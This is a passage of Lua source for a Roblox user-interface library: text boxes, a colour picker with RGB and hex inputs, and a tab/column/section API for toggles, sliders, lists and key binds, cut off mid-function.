	library.createBox = function(option, parent)
		option.hasInit = true

		option.main = library:Create("Frame", {
			LayoutOrder = option.position,
			Size = UDim2.new(1, 0, 0, option.text == "nil" and 28 or 44),
			BackgroundTransparency = 1,
			Parent = parent
		})

		if option.text ~= "nil" then
			option.title = library:Create("TextLabel", {
				Position = UDim2.new(0, 6, 0, 0),
				Size = UDim2.new(1, -12, 0, 18),
				BackgroundTransparency = 1,
				Text = option.text,
				TextSize = 15,
				Font = Enum.Font.Code,
				TextColor3 = Color3.fromRGB(210, 210, 210),
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = option.main
			})
		end

		option.holder = library:Create("Frame", {
			Position = UDim2.new(0, 6, 0, option.text == "nil" and 4 or 20),
			Size = UDim2.new(1, -12, 0, 20),
			BackgroundColor3 = Color3.fromRGB(50, 50, 50),
			BorderColor3 = Color3.new(),
			Parent = option.main
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.8,
			Parent = option.holder
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.holder
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.holder
		})

		local inputvalue = library:Create("TextBox", {
			Position = UDim2.new(0, 4, 0, 0),
			Size = UDim2.new(1, -4, 1, 0),
			BackgroundTransparency = 1,
			Text = "  " .. option.value,
			TextSize = 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.new(1, 1, 1),
			TextXAlignment = Enum.TextXAlignment.Left,
			TextWrapped = true,
			ClearTextOnFocus = false,
			Parent = option.holder
		})

		inputvalue.FocusLost:connect(function(enter)
			option.holder.BorderColor3 = Color3.new()
			option:SetValue(inputvalue.Text, enter)
		end)

		inputvalue.Focused:connect(function()
			option.holder.BorderColor3 = library.flags["Menu Accent Color"]
		end)

		inputvalue.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				inputvalue.Text = ""
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					option.holder.BorderColor3 = library.flags["Menu Accent Color"]
				end
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
		end)

		inputvalue.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		inputvalue.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if not inputvalue:IsFocused() then
					option.holder.BorderColor3 = Color3.new()
				end
				library.tooltip.Position = UDim2.new(2)
			end
		end)

		function option:SetValue(value, enter)
			if tostring(value) == "" then
				inputvalue.Text = self.value
			else
				library.flags[self.flag] = tostring(value)
				self.value = tostring(value)
				inputvalue.Text = self.value
				self.callback(value, enter)
			end
		end
		delay(1, function()
			if library then
				option:SetValue(option.value)
			end
		end)
	end

	library.createColorPickerWindow = function(option)
		option.mainHolder = library:Create("TextButton", {
			ZIndex = 4,
			--Position = UDim2.new(1, -184, 1, 6),
			Size = UDim2.new(0, option.trans and 200 or 184, 0, 264),
			BackgroundColor3 = Color3.fromRGB(40, 40, 40),
			BorderColor3 = Color3.new(),
			AutoButtonColor = false,
			Visible = false,
			Parent = library.base
		})

		option.rgbBox = library:Create("Frame", {
			Position = UDim2.new(0, 6, 0, 214),
			Size = UDim2.new(0, (option.mainHolder.AbsoluteSize.X - 12), 0, 20),
			BackgroundColor3 = Color3.fromRGB(57, 57, 57),
			BorderColor3 = Color3.new(),
			ZIndex = 5;
			Parent = option.mainHolder
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.8,
			ZIndex = 6;
			Parent = option.rgbBox
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			ZIndex = 6;
			Parent = option.rgbBox
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			ZIndex = 6;
			Parent = option.rgbBox
		})

		option.rgbInput = library:Create("TextBox", {
			Position = UDim2.new(0, 4, 0, 0),
			Size = UDim2.new(1, -4, 1, 0),
			BackgroundTransparency = 1,
			Text = tostring(option.color),
			TextSize = 14,
			Font = Enum.Font.Code,
			TextColor3 = Color3.new(1, 1, 1),
			TextXAlignment = Enum.TextXAlignment.Center,
			TextWrapped = true,
			ClearTextOnFocus = false,
			ZIndex = 6;
			Parent = option.rgbBox
		})

		option.hexBox = option.rgbBox:Clone()
		option.hexBox.Position = UDim2.new(0, 6, 0, 238)
		-- option.hexBox.Size = UDim2.new(0, (option.mainHolder.AbsoluteSize.X/2 - 10), 0, 20)
		option.hexBox.Parent = option.mainHolder
		option.hexInput = option.hexBox.TextBox;

		library:Create("ImageLabel", {
			ZIndex = 4,
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.mainHolder
		})

		library:Create("ImageLabel", {
			ZIndex = 4,
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.mainHolder
		})

		local hue, sat, val = Color3.toHSV(option.color)
		hue, sat, val = hue == 0 and 1 or hue, sat + 0.005, val - 0.005
		local editinghue
		local editingsatval
		local editingtrans

		local transMain
		if option.trans then
			transMain = library:Create("ImageLabel", {
				ZIndex = 5,
				Size = UDim2.new(1, 0, 1, 0),
				BackgroundTransparency = 1,
				Image = "rbxassetid://2454009026",
				ImageColor3 = Color3.fromHSV(hue, 1, 1),
				Rotation = 180,
				Parent = library:Create("ImageLabel", {
					ZIndex = 4,
					AnchorPoint = Vector2.new(1, 0),
					Position = UDim2.new(1, -6, 0, 6),
					Size = UDim2.new(0, 10, 1, -60),
					BorderColor3 = Color3.new(),
					Image = "rbxassetid://4632082392",
					ScaleType = Enum.ScaleType.Tile,
					TileSize = UDim2.new(0, 5, 0, 5),
					Parent = option.mainHolder
				})
			})

			option.transSlider = library:Create("Frame", {
				ZIndex = 5,
				Position = UDim2.new(0, 0, option.trans, 0),
				Size = UDim2.new(1, 0, 0, 2),
				BackgroundColor3 = Color3.fromRGB(38, 41, 65),
				BorderColor3 = Color3.fromRGB(255, 255, 255),
				Parent = transMain
			})

			transMain.InputBegan:connect(function(Input)
				if Input.UserInputType.Name == "MouseButton1" then
					editingtrans = true
					option:SetTrans(1 - ((Input.Position.Y - transMain.AbsolutePosition.Y) / transMain.AbsoluteSize.Y))
				end
			end)

			transMain.InputEnded:connect(function(Input)
				if Input.UserInputType.Name == "MouseButton1" then
					editingtrans = false
				end
			end)
		end

		local hueMain = library:Create("Frame", {
			ZIndex = 4,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, 6, 1, -54),
			Size = UDim2.new(1, option.trans and -28 or -12, 0, 10),
			BackgroundColor3 = Color3.new(1, 1, 1),
			BorderColor3 = Color3.new(),
			Parent = option.mainHolder
		})

		local Gradient = library:Create("UIGradient", {
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
				ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 0, 255)),
				ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 0, 255)),
				ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
				ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 255, 0)),
				ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 255, 0)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
			}),
			Parent = hueMain
		})

		local hueSlider = library:Create("Frame", {
			ZIndex = 4,
			Position = UDim2.new(1 - hue, 0, 0, 0),
			Size = UDim2.new(0, 2, 1, 0),
			BackgroundColor3 = Color3.fromRGB(38, 41, 65),
			BorderColor3 = Color3.fromRGB(255, 255, 255),
			Parent = hueMain
		})

		hueMain.InputBegan:connect(function(Input)
			if Input.UserInputType.Name == "MouseButton1" then
				editinghue = true
				X = (hueMain.AbsolutePosition.X + hueMain.AbsoluteSize.X) - hueMain.AbsolutePosition.X
				X = math.clamp((Input.Position.X - hueMain.AbsolutePosition.X) / X, 0, 0.995)
				option:SetColor(Color3.fromHSV(1 - X, sat, val))
			end
		end)

		hueMain.InputEnded:connect(function(Input)
			if Input.UserInputType.Name == "MouseButton1" then
				editinghue = false
			end
		end)

		local satval = library:Create("ImageLabel", {
			ZIndex = 4,
			Position = UDim2.new(0, 6, 0, 6),
			Size = UDim2.new(1, option.trans and -28 or -12, 1, -74),
			BackgroundColor3 = Color3.fromHSV(hue, 1, 1),
			BorderColor3 = Color3.new(),
			Image = "rbxassetid://4155801252",
			ClipsDescendants = true,
			Parent = option.mainHolder
		})

		local satvalSlider = library:Create("Frame", {
			ZIndex = 4,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(sat, 0, 1 - val, 0),
			Size = UDim2.new(0, 4, 0, 4),
			Rotation = 45,
			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			Parent = satval
		})

		satval.InputBegan:connect(function(Input)
			if Input.UserInputType.Name == "MouseButton1" then
				editingsatval = true
				X = (satval.AbsolutePosition.X + satval.AbsoluteSize.X) - satval.AbsolutePosition.X
				Y = (satval.AbsolutePosition.Y + satval.AbsoluteSize.Y) - satval.AbsolutePosition.Y
				X = math.clamp((Input.Position.X - satval.AbsolutePosition.X) / X, 0.005, 1)
				Y = math.clamp((Input.Position.Y - satval.AbsolutePosition.Y) / Y, 0, 0.995)
				option:SetColor(Color3.fromHSV(hue, X, 1 - Y))
			end
		end)

		library:AddConnection(inputService.InputChanged, function(Input)
			if Input.UserInputType.Name == "MouseMovement" then
				if editingsatval then
					X = (satval.AbsolutePosition.X + satval.AbsoluteSize.X) - satval.AbsolutePosition.X
					Y = (satval.AbsolutePosition.Y + satval.AbsoluteSize.Y) - satval.AbsolutePosition.Y
					X = math.clamp((Input.Position.X - satval.AbsolutePosition.X) / X, 0.005, 1)
					Y = math.clamp((Input.Position.Y - satval.AbsolutePosition.Y) / Y, 0, 0.995)
					option:SetColor(Color3.fromHSV(hue, X, 1 - Y))
				elseif editinghue then
					X = (hueMain.AbsolutePosition.X + hueMain.AbsoluteSize.X) - hueMain.AbsolutePosition.X
					X = math.clamp((Input.Position.X - hueMain.AbsolutePosition.X) / X, 0, 0.995)
					option:SetColor(Color3.fromHSV(1 - X, sat, val))
				elseif editingtrans then
					option:SetTrans(1 - ((Input.Position.Y - transMain.AbsolutePosition.Y) / transMain.AbsoluteSize.Y))
				end
			end
		end)

		satval.InputEnded:connect(function(Input)
			if Input.UserInputType.Name == "MouseButton1" then
				editingsatval = false
			end
		end)

		local r, g, b = library.round(option.color)
		option.hexInput.Text = string.format("#%02x%02x%02x", r, g, b)
		option.rgbInput.Text = table.concat({r, g, b}, ",")

		option.rgbInput.FocusLost:connect(function()
			local r, g, b = option.rgbInput.Text:gsub("%s+", ""):match("(%d+),(%d+),(%d+)")
			if r and g and b then
				local color = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
				return option:SetColor(color)
			end

			local r, g, b = library.round(option.color)
			option.rgbInput.Text = table.concat({r, g, b}, ",")
		end)

		option.hexInput.FocusLost:connect(function()
			local r, g, b = option.hexInput.Text:match("#?(..)(..)(..)")
			if r and g and b then
				local color = Color3.fromRGB(tonumber("0x"..r), tonumber("0x"..g), tonumber("0x"..b))
				return option:SetColor(color)
			end

			local r, g, b = library.round(option.color)
			option.hexInput.Text = string.format("#%02x%02x%02x", r, g, b)
		end)

		function option:updateVisuals(Color)
			hue, sat, val = Color3.toHSV(Color)
			hue = hue == 0 and 1 or hue
			satval.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
			if option.trans then
				transMain.ImageColor3 = Color3.fromHSV(hue, 1, 1)
			end
			hueSlider.Position = UDim2.new(1 - hue, 0, 0, 0)
			satvalSlider.Position = UDim2.new(sat, 0, 1 - val, 0)

			local r, g, b = library.round(Color3.fromHSV(hue, sat, val))

			option.hexInput.Text = string.format("#%02x%02x%02x", r, g, b)
			option.rgbInput.Text = table.concat({r, g, b}, ",")
		end

		return option
	end

	library.createColor = function(option, parent)
		option.hasInit = true

		if option.sub then
			option.main = option:getMain()
		else
			option.main = library:Create("Frame", {
				LayoutOrder = option.position,
				Size = UDim2.new(1, 0, 0, 20),
				BackgroundTransparency = 1,
				Parent = parent
			})

			option.title = library:Create("TextLabel", {
				Position = UDim2.new(0, 6, 0, 0),
				Size = UDim2.new(1, -12, 1, 0),
				BackgroundTransparency = 1,
				Text = option.text,
				TextSize = 15,
				Font = Enum.Font.Code,
				TextColor3 = Color3.fromRGB(210, 210, 210),
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = option.main
			})
		end

		option.visualize = library:Create(option.sub and "TextButton" or "Frame", {
			Position = UDim2.new(1, -(option.subpos or 0) - 24, 0, 4),
			Size = UDim2.new(0, 18, 0, 12),
			SizeConstraint = Enum.SizeConstraint.RelativeYY,
			BackgroundColor3 = option.color,
			BorderColor3 = Color3.new(),
			Parent = option.main
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.6,
			Parent = option.visualize
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.visualize
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.visualize
		})

		local interest = option.sub and option.visualize or option.main

		if option.sub then
			option.visualize.Text = ""
			option.visualize.AutoButtonColor = false
		end

		interest.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				if not option.mainHolder then library.createColorPickerWindow(option) end
				if library.popup == option then library.popup:Close() return end
				if library.popup then library.popup:Close() end
				option.open = true
				local pos = option.main.AbsolutePosition
				option.mainHolder.Position = UDim2.new(0, pos.X + 36 + (option.trans and -16 or 0), 0, pos.Y + 56)
				option.mainHolder.Visible = true
				library.popup = option
				option.visualize.BorderColor3 = library.flags["Menu Accent Color"]
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					option.visualize.BorderColor3 = library.flags["Menu Accent Color"]
				end
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
		end)

		interest.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		interest.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if not option.open then
					option.visualize.BorderColor3 = Color3.new()
				end
				library.tooltip.Position = UDim2.new(2)
			end
		end)

		function option:SetColor(newColor, nocallback)
			if typeof(newColor) == "table" then
				newColor = Color3.new(newColor[1], newColor[2], newColor[3])
			end
			newColor = newColor or Color3.new(1, 1, 1)
			if self.mainHolder then
				self:updateVisuals(newColor)
			end
			option.visualize.BackgroundColor3 = newColor
			library.flags[self.flag] = newColor
			self.color = newColor
			if not nocallback then
				self.callback(newColor)
			end
		end

		if option.trans then
			function option:SetTrans(value, manual)
				value = math.clamp(tonumber(value) or 0, 0, 1)
				if self.transSlider then
					self.transSlider.Position = UDim2.new(0, 0, value, 0)
				end
				self.trans = value
				library.flags[self.flag .. " Transparency"] = 1 - value
				self.calltrans(value)
			end
			option:SetTrans(option.trans)
		end

		delay(1, function()
			if library then
				option:SetColor(option.color)
			end
		end)

		function option:Close()
			library.popup = nil
			self.open = false
			self.mainHolder.Visible = false
			option.visualize.BorderColor3 = Color3.new()
		end
	end

	function library:AddTab(title, pos)
		local tab = {canInit = true, tabs = {}, columns = {}, title = tostring(title)}
		table.insert(self.tabs, pos or #self.tabs + 1, tab)

		function tab:AddColumn()
			local column = {sections = {}, position = #self.columns, canInit = true, tab = self}
			table.insert(self.columns, column)

			function column:AddSection(title)
				local section = {title = tostring(title), options = {}, canInit = true, column = self}
				table.insert(self.sections, section)

				function section:AddLabel(text)
					local option = {text = text}
					option.section = self
					option.type = "label"
					option.position = #self.options
					option.canInit = true
					table.insert(self.options, option)

					if library.hasInit and self.hasInit then
						library.createLabel(option, self.content)
					else
						option.Init = library.createLabel
					end

					return option
				end

				function section:AddDivider(text)
					local option = {text = text}
					option.section = self
					option.type = "divider"
					option.position = #self.options
					option.canInit = true
					table.insert(self.options, option)

					if library.hasInit and self.hasInit then
						library.createDivider(option, self.content)
					else
						option.Init = library.createDivider
					end

					return option
				end

				function section:AddToggle(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.state = option.state == nil and nil or (typeof(option.state) == "boolean" and option.state or false)
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.type = "toggle"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.subcount = 0
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					option.style = option.style == 2
					library.flags[option.flag] = option.state
					table.insert(self.options, option)
					library.options[option.flag] = option

					function option:AddColor(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddColor(subOption)
					end

					function option:AddBind(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddBind(subOption)
					end

					function option:AddList(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddList(subOption)
					end

					function option:AddSlider(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddSlider(subOption)
					end

					if library.hasInit and self.hasInit then
						library.createToggle(option, self.content)
					else
						option.Init = library.createToggle
					end

					return option
				end

				function section:AddButton(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.type = "button"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.subcount = 0
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					table.insert(self.options, option)
					library.options[option.flag] = option

					function option:AddBind(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() option.main.Size = UDim2.new(1, 0, 0, 40) return option.main end
						self.subcount = self.subcount + 1
						return section:AddBind(subOption)
					end

					function option:AddColor(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() option.main.Size = UDim2.new(1, 0, 0, 40) return option.main end
						self.subcount = self.subcount + 1
						return section:AddColor(subOption)
					end

					if library.hasInit and self.hasInit then
						library.createButton(option, self.content)
					else
						option.Init = library.createButton
					end

					return option
				end

				function section:AddBind(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.key = (option.key and option.key.Name) or option.key or "none"
					option.nomouse = typeof(option.nomouse) == "boolean" and option.nomouse or false
					option.mode = typeof(option.mode) == "string" and (option.mode == "toggle" or option.mode == "hold" and option.mode) or "toggle"
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.type = "bind"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					table.insert(self.options, option)
					library.options[option.flag] = option

					if library.hasInit and self.hasInit then
						library.createBind(option, self.content)
					else
						option.Init = library.createBind
					end

					return option
				end

				function section:AddSlider(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.min = typeof(option.min) == "number" and option.min or 0
					option.max = typeof(option.max) == "number" and option.max or 0
					option.value = option.min < 0 and 0 or math.clamp(typeof(option.value) == "number" and option.value or option.min, option.min, option.max)
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.float = typeof(option.value) == "number" and option.float or 1
					option.suffix = option.suffix and tostring(option.suffix) or ""
					option.textpos = option.textpos == 2
					option.type = "slider"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.subcount = 0
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					library.flags[option.flag] = option.value
					table.insert(self.options, option)
					library.options[option.flag] = option

					function option:AddColor(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddColor(subOption)
					end

					function option:AddBind(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddBind(subOption)
					end

					if library.hasInit and self.hasInit then
						library.createSlider(option, self.content)
					else
						option.Init = library.createSlider
					end

					return option
				end

				function section:AddList(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.values = typeof(option.values) == "table" and option.values or {}
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.multiselect = typeof(option.multiselect) == "boolean" and option.multiselect or false
					--option.groupbox = (not option.multiselect) and (typeof(option.groupbox) == "boolean" and option.groupbox or false)
					option.value = option.multiselect and (typeof(option.value) == "table" and option.value or {}) or tostring(option.value or option.values[1] or "")
					if option.multiselect then
						for i,v in next, option.values do
							option.value[v] = false
						end
					end
					option.max = option.max or 4
					option.open = false
					option.type = "list"
					option.position = #self.options
					option.labels = {}
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.subcount = 0
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					library.flags[option.flag] = option.value
					table.insert(self.options, option)
					library.options[option.flag] = option

					function option:AddValue(value, state)
						if self.multiselect then
							self.values[value] = state
						else
							table.insert(self.values, value)
						end
					end

					function option:AddColor(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddColor(subOption)
					end

					function option:AddBind(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddBind(subOption)
					end

					if library.hasInit and self.hasInit then
						library.createList(option, self.content)
					else
						option.Init = library.createList
					end

					return option
				end

				function section:AddBox(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.value = tostring(option.value or "")
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.type = "box"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					library.flags[option.flag] = option.value
					table.insert(self.options, option)
					library.options[option.flag] = option

					if library.hasInit and self.hasInit then
						library.createBox(option, self.content)
					else
						option.Init = library.createBox
					end

					return option
				end

				function section:AddColor(option)
					option = typeof(option) == "table" and option or {}
					option.section = self
					option.text = tostring(option.text)
					option.color = typeof(option.color) == "table" and Color3.new(option.color[1], option.color[2], option.color[3]) or option.color or Color3.new(1, 1, 1)
					option.callback = typeof(option.callback) == "function" and option.callback or function() end
					option.calltrans = typeof(option.calltrans) == "function" and option.calltrans or (option.calltrans == 1 and option.callback) or function() end
					option.open = false
					option.trans = tonumber(option.trans)
					option.subcount = 1
					option.type = "color"
					option.position = #self.options
					option.flag = (library.flagprefix and library.flagprefix .. " " or "") .. (option.flag or option.text)
					option.canInit = (option.canInit ~= nil and option.canInit) or true
					option.tip = option.tip and tostring(option.tip)
					library.flags[option.flag] = option.color
					table.insert(self.options, option)
					library.options[option.flag] = option

					function option:AddColor(subOption)
						subOption = typeof(subOption) == "table" and subOption or {}
						subOption.sub = true
						subOption.subpos = self.subcount * 24
						function subOption:getMain() return option.main end
						self.subcount = self.subcount + 1
						return section:AddColor(subOption)
					end

					if option.trans then
						library.flags[option.flag .. " Transparency"] = option.trans
					end

					if library.hasInit and self.hasInit then
						library.createColor(option, self.content)
					else
						option.Init = library.createColor
					end

					return option
				end

				function section:SetTitle(newTitle)
					self.title = tostring(newTitle)
					if self.titleText then
						self.titleText.Text = tostring(newTitle)
					end
				end

				function section:Init()
					if self.hasInit then return end
					self.hasInit = true

					self.main = library:Create("Frame", {
						BackgroundColor3 = Color3.fromRGB(30, 30, 30),
						BorderColor3 = Color3.new(),
						Parent = column.main
					})

					self.content = library:Create("Frame", {
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundColor3 = Color3.fromRGB(30, 30, 30),
						BorderColor3 = Color3.fromRGB(60, 60, 60),
						BorderMode = Enum.BorderMode.Inset,
						Parent = self.main
					})

					library:Create("ImageLabel", {
						Size = UDim2.new(1, -2, 1, -2),
						Position = UDim2.new(0, 1, 0, 1),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2592362371",
						ImageColor3 = Color3.new(),
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 62, 62),
						Parent = self.main
					})

					table.insert(library.theme, library:Create("Frame", {
						Size = UDim2.new(1, 0, 0, 1),
						BackgroundColor3 = library.flags["Menu Accent Color"],
						BorderSizePixel = 0,
						BorderMode = Enum.BorderMode.Inset,
						Parent = self.main
					}))

					local layout = library:Create("UIListLayout", {
						HorizontalAlignment = Enum.HorizontalAlignment.Center,
						SortOrder = Enum.SortOrder.LayoutOrder,
						Padding = UDim.new(0, 2),
						Parent = self.content
					})

					library:Create("UIPadding", {
						PaddingTop = UDim.new(0, 12),
						Parent = self.content
					})

					self.titleText = library:Create("TextLabel", {
						AnchorPoint = Vector2.new(0, 0.5),
						Position = UDim2.new(0, 12, 0, 0),
						Size = UDim2.new(0, textService:GetTextSize(self.title, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X + 10, 0, 3),
						BackgroundColor3 = Color3.fromRGB(30, 30, 30),
						BorderSizePixel = 0,
						Text = self.title,
						TextSize = 15,
						Font = Enum.Font.Code,
						TextColor3 = Color3.new(1, 1, 1),
						Parent = self.main
					})

					layout.Changed:connect(function()
						self.main.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y + 16)
					end)

					for _, option in next, self.options do
						if option.canInit then
							option.Init(option, self.content)
						end
					end
				end

				if library.hasInit and self.hasInit then
					section:Init()
				end

				return section
			end

			function column:Init()
				if self.hasInit then return end
				self.hasInit = true

				self.main = library:Create("ScrollingFrame", {
					ZIndex = 2,
					Position = UDim2.new(0, 6 + (self.position * 239), 0, 2),
					Size = UDim2.new(0, 233, 1, -4),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					ScrollBarImageColor3 = Color3.fromRGB(),
					ScrollBarThickness = 4,	
					VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar,
					ScrollingDirection = Enum.ScrollingDirection.Y,
					Visible = false,
					Parent = library.columnHolder
